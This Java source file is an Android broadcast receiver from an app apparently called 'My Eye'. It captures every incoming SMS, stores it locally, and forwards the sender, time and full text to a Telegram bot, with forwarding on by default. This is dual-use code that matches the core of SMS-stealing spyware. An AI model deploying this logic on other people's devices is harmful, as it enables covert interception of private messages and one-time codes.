package com.ahamedrahim.myeye;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class SMSReceiver extends BroadcastReceiver {
    
    private static final String TAG = "SMSReceiver";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = sms.getDisplayOriginatingAddress();
                        String message = sms.getMessageBody();
                        long timestamp = sms.getTimestampMillis();
                        
                        // Format time
                        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault());
                        String time = sdf.format(new Date(timestamp));
                        
                        // Save to database
                        saveToDatabase(context, sender, message, time);
                        
                        // Send to Telegram
                        sendToTelegram(context, sender, message, time);
                    }
                }
            }
        }
    }
    
    private void saveToDatabase(Context context, String sender, String message, String time) {
        DatabaseHelper dbHelper = new DatabaseHelper(context);
        dbHelper.addSMS(sender, message, time);
        dbHelper.close();
        
        // Update stats
        SharedPreferences prefs = context.getSharedPreferences("MyEyeStats", Context.MODE_PRIVATE);
        int count = prefs.getInt("sms_count", 0) + 1;
        prefs.edit()
            .putInt("sms_count", count)
            .putLong("last_sync", System.currentTimeMillis())
            .apply();
    }
    
    private void sendToTelegram(Context context, String sender, String message, String time) {
        SharedPreferences prefs = context.getSharedPreferences("TelegramPrefs", Context.MODE_PRIVATE);
        String botToken = prefs.getString("bot_token", "");
        String chatId = prefs.getString("chat_id", "");
        boolean isEnabled = prefs.getBoolean("notify_sms", true);
        
        if (!isEnabled || botToken.isEmpty() || chatId.isEmpty()) {
            return;
        }
        
        String telegramMessage = "📱 *New SMS Received*\n\n" +
                "👤 From: `" + sender + "`\n" +
                "⏰ Time: " + time + "\n" +
                "💬 Message: " + message + "\n\n" +
                "📲 _Sent via My Eye App_";
        
        OkHttpClient client = new OkHttpClient();
        RequestBody formBody = new FormBody.Builder()
                .add("chat_id", chatId)
                .add("text", telegramMessage)
                .add("parse_mode", "Markdown")
                .build();
        
        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + botToken + "/sendMessage")
                .post(formBody)
                .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Failed to send SMS to Telegram: " + e.getMessage());
            }
            
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (!response.isSuccessful()) {
                    Log.e(TAG, "Failed to send SMS to Telegram: " + response.code());
                }
                response.close();
            }
        });
    }
            }
